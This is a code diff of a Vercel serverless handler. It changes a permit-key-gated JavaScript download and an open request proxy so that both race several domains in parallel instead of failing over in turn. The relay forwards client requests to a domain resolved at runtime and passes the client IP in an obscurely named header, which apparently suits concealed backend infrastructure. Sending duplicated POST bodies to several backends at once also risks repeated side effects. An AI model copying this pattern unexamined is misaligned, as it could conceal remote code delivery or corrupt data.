@@ -154,14 +154,11 @@ async function fetchTargetDomain() {
 // ── CDN JS downloader ─────────────────────────────────────────────────────────
 
 async function downloadJSWithFailover(cdnUrl, endpoint) {
-    const domains = [cdnUrl, FALLBACK_DOMAIN].filter(Boolean);
-    let lastError = null;
-
-    for (let i = 0; i < domains.length; i++) {
-        const domain = domains[i];
+    const rawDomains = [cdnUrl, FALLBACK_DOMAIN].filter(Boolean);
+    const domains = [...new Set(rawDomains)];
+    
+    const promises = domains.map(async (domain) => {
         const url = domain.replace(/\/$/, '') + '/jscdn/' + endpoint;
-        const timeout = (i === 0 && domains.length > 1) ? 3000 : 15000;
-
         try {
             const res = await fetchUrl(url, {
                 method: 'POST',
@@ -170,16 +167,18 @@ async function downloadJSWithFailover(cdnUrl, endpoint) {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({ permit_key: PERMIT_KEY }),
-                timeout: timeout,
+                timeout: 10000,
             });
-
             if (res.status === 200) return res.data;
-            lastError = `Status ${res.status}`;
-        } catch (e) {
-            lastError = e.message;
-        }
+            throw new Error(`Status ${res.status}`);
+        } catch (e) { throw e; }
+    });
+
+    try {
+        return await Promise.any(promises);
+    } catch {
+        return null;
     }
-    return null;
 }
 
 // ── Vercel handler ────────────────────────────────────────────────────────────
@@ -207,52 +206,53 @@ module.exports = async function handler(req, res) {
     if (e) {
         try {
             const resolvedDomain = await fetchTargetDomain();
-            const domains = [resolvedDomain, FALLBACK_DOMAIN].filter(Boolean);
+            const rawDomains = [resolvedDomain, FALLBACK_DOMAIN].filter(Boolean);
+            const domains = [...new Set(rawDomains)];
             const endpoint = '/' + String(e).replace(/^\/+/, '');
-            let lastProxyError = null;
+            
+            const clientIP = getClientIP(req);
+            const fwdHeaders = { ...req.headers };
+            ['host', 'Host', 'origin', 'Origin', 'accept-encoding',
+                'Accept-Encoding', 'content-encoding', 'Content-Encoding'].forEach(
+                    (h) => delete fwdHeaders[h]
+                );
+            fwdHeaders['x-dfkjldifjlifjd'] = clientIP;
 
-            for (let i = 0; i < domains.length; i++) {
-                const domain = domains[i];
+            // Read body once for all parallel attempts
+            let body = null;
+            if (!['GET', 'HEAD'].includes(req.method)) {
+                body = await new Promise((resolve) => {
+                    const chunks = [];
+                    req.on('data', (c) => chunks.push(c));
+                    req.on('end', () => resolve(Buffer.concat(chunks).toString()));
+                });
+            }
+
+            const proxyPromises = domains.map(async (domain) => {
                 const url = domain.replace(/\/$/, '') + endpoint;
-                const clientIP = getClientIP(req);
-
-                const fwdHeaders = { ...req.headers };
-                ['host', 'Host', 'origin', 'Origin', 'accept-encoding',
-                    'Accept-Encoding', 'content-encoding', 'Content-Encoding'].forEach(
-                        (h) => delete fwdHeaders[h]
-                    );
-                fwdHeaders['x-dfkjldifjlifjd'] = clientIP;
-
-                let body = null;
-                if (!['GET', 'HEAD'].includes(req.method)) {
-                    body = await new Promise((resolve) => {
-                        const chunks = [];
-                        req.on('data', (c) => chunks.push(c));
-                        req.on('end', () => resolve(Buffer.concat(chunks).toString()));
-                    });
-                }
-
                 try {
                     const proxyRes = await fetchUrl(url, {
                         method: req.method,
                         headers: fwdHeaders,
                         body: body || undefined,
-                        timeout: (i === 0) ? 5000 : 30000,
+                        timeout: 10000,
                     });
+                    if (proxyRes.status < 500) return proxyRes; // 2xx or 4xx is a valid response
+                    throw new Error(`5xx Error ${proxyRes.status}`);
+                } catch (e) { throw e; }
+            });
 
-                    if (proxyRes.status < 500) { // If it's a 4xx it's a real response, 5xx we fail over
-                        res.setHeader('Access-Control-Allow-Origin', '*');
-                        if (proxyRes.headers['content-type'])
-                            res.setHeader('Content-Type', proxyRes.headers['content-type']);
-                        return res.status(proxyRes.status).send(proxyRes.data);
-                    }
-                } catch (e) {
-                    lastProxyError = e.message;
-                }
+            try {
+                const fastestRes = await Promise.any(proxyPromises);
+                res.setHeader('Access-Control-Allow-Origin', '*');
+                if (fastestRes.headers['content-type'])
+                    res.setHeader('Content-Type', fastestRes.headers['content-type']);
+                return res.status(fastestRes.status).send(fastestRes.data);
+            } catch (err) {
+                return res.status(502).send(`Parallel Proxy Error: ${err.message}`);
             }
-            return res.status(502).send(`Proxy Failover Error: ${lastProxyError}`);
         } catch (e) {
-            return res.status(500).send(`Root Error: ${e.message}`);
+            return res.status(500).send(`Critical API Error: ${e.message}`);
         }
     }
 
